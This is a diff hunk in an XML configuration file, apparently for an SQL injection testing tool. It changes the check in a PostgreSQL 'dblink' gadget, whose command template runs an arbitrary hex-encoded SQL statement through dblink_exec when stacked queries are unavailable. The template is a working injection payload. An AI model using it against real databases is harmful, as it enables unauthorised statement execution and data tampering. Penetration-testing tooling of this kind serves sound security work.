@@ -139,7 +139,7 @@
         </procedures>
         <gadgets>
             <!-- Out-of-technique statement execution when stacked queries are not available (e.g. WHERE clause injection). The '%s' placeholder receives the hex-encoded statement, rebuilt server-side to survive string escaping. -->
-            <dblink check="(SELECT COUNT(*) FROM pg_extension WHERE extname='dblink')&gt;0" command="(SELECT LENGTH(dblink_exec('dbname='||current_database(),CONVERT_FROM(DECODE('%s','hex'),'UTF8'))))"/>
+            <dblink check="(SELECT dblink_exec('dbname='||current_database(),'RESET application_name') IS NOT NULL)" command="(SELECT LENGTH(dblink_exec('dbname='||current_database(),CONVERT_FROM(DECODE('%s','hex'),'UTF8'))))"/>
         </gadgets>
         <dbs>
             <inband query="SELECT DISTINCT(schemaname) FROM pg_tables"/>
